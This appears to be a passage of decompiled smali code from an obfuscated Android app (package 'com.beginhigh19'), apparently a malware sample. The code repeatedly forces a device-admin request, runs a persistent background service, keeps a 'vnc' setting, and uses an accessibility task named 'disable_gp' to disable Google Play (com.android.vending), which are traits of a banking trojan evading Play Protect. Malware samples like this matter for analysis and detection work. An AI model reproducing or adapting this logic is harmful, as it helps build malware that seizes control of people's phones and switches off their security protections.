    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-static {v6}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0, v3}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_1
    if-ne v2, v5, :cond_2

    const-string v0, "AT_ERROR: 10 attempts to get device admin reached, skipping"

    invoke-static {p1, v0}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V

    add-int/2addr v2, v1

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v2, "admin_attempts"

    invoke-static {p1, v2, v0}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    :cond_2
    return v1

    :cond_3
    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v7, "get_device_admin_delay"

    invoke-static {p1, v7, v5}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Integer;->intValue()I

    move-result v5

    const-wide/16 v7, 0x0

    invoke-static {v7, v8}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v7

    const-string v8, "uptime"

    invoke-static {p1, v8, v7}, Lfddo/throw;->for(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Long;)Ljava/lang/Long;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Long;->longValue()J

    move-result-wide v7

    int-to-long v9, v5

    cmp-long v9, v7, v9

    if-gez v9, :cond_4

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "DEVADM up:"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v7, v8}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v0, " ; delay:"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, ">>p054v"

    invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return v1

    :cond_4
    invoke-static {v6}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {p1, v5, v4}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v4, Landroid/content/Intent;

    const-class v5, Lcom/beginhigh19/p085x;

    invoke-direct {v4, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v5, 0x10000000

    invoke-virtual {v4, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v5, 0x20000000

    invoke-virtual {v4, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v4}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    add-int/2addr v2, v1

    invoke-static {v0}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {p1, v0, v1}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    invoke-static {}, Lfddo/goto;->grethwjrsfhj()Z

    move-result p1

    if-eqz p1, :cond_5

    const-wide/16 v0, 0x2710

    goto :goto_0

    :cond_5
    const-wide/16 v0, 0x3e8

    :goto_0
    invoke-static {v0, v1}, Lfddo/goto;->p(J)V

    return v3
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Lcom/beginhigh19/p054v;->ifdf:Z

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 3

    const-string p2, "fg"

    const/4 p3, 0x2

    if-nez p1, :cond_0

    return p3

    :cond_0
    const/4 v0, 0x1

    :try_start_0
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {p1, p2}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_3

    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    invoke-virtual {v2, p2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_3

    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object p1

    invoke-virtual {p1, p2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string p2, "start"

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_1

    invoke-direct {p0, v1}, Lcom/beginhigh19/p054v;->while(Landroid/content/Context;)V

    goto :goto_0

    :cond_1
    const-string p2, "stop"

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_2

    invoke-direct {p0}, Lcom/beginhigh19/p054v;->import()V

    :cond_2
    :goto_0
    return v0

    :cond_3
    sget-boolean p1, Lcom/beginhigh19/p054v;->ifdf:Z

    if-eqz p1, :cond_4

    return p3

    :cond_4
    sput-boolean v0, Lcom/beginhigh19/p054v;->ifdf:Z

    invoke-static {v1}, Lfddo/goto;->dfhaefdhadfhdfherh(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_5

    invoke-direct {p0, v1}, Lcom/beginhigh19/p054v;->while(Landroid/content/Context;)V

    :cond_5
    new-instance p1, Ljava/lang/Thread;

    new-instance p2, Lcom/beginhigh19/p054v$fddo;

    invoke-direct {p2, p0}, Lcom/beginhigh19/p054v$fddo;-><init>(Lcom/beginhigh19/p054v;)V

    invoke-direct {p1, p2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {p1}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    const-string p3, "EXC_GLOB_ONSTART"

    invoke-static {p2, p3, p1}, Lfddo/goto;->class(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Exception;)V

    :goto_1
    return v0
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Lcom/beginhigh19/p054v;->ifdf:Z

    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    return-void
.end method

.method public try(Landroid/content/Context;)Z
    .locals 8

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    const-string v1, "gp_disabled"

    invoke-static {p1, v1, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    const/4 v2, 0x1

    if-eqz v0, :cond_0

    return v2

    :cond_0
    const-string v0, "vnc"

    const-string v3, ""

    invoke-static {p1, v0, v3}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    return v2

    :cond_1
    const-wide/16 v3, 0x0

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    const-string v5, "attempt_disable_gp_ts"

    invoke-static {p1, v5, v0}, Lfddo/throw;->for(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Long;)Ljava/lang/Long;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v6

    cmp-long v0, v6, v3

    const/4 v3, 0x0

    if-eqz v0, :cond_2

    const/16 v0, 0x78

    invoke-static {p1, v5, v0, v3}, Lfddo/goto;->dkgmhapefdmhpadfmhspfkgmh(Landroid/content/Context;Ljava/lang/String;IZ)Z

    move-result v0

    if-eqz v0, :cond_2

    return v2

    :cond_2
    const-string v0, "com.android.vending"

    invoke-static {v0}, Lcom/beginhigh19/p023w;->fddo(Ljava/lang/String;)Z

    move-result v0

    const-wide/16 v6, 0x3e8

    if-eqz v0, :cond_3

    invoke-static {v6, v7}, Lfddo/goto;->p(J)V

    return v3

    :cond_3
    invoke-static {p1}, Lfddo/goto;->rgjsrtfjktyfj(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_4

    const-string v0, "acsb_task"

    const-string v1, "disable_gp"

    invoke-static {p1, v0, v1}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "gp_step"

    invoke-static {p1, v1, v0}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    invoke-static {p1, v5, v0}, Lfddo/throw;->goto(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Long;)V

    invoke-static {v6, v7}, Lfddo/goto;->p(J)V

    return v3

    :cond_4
    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, v1, v0}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    return v2
.end method
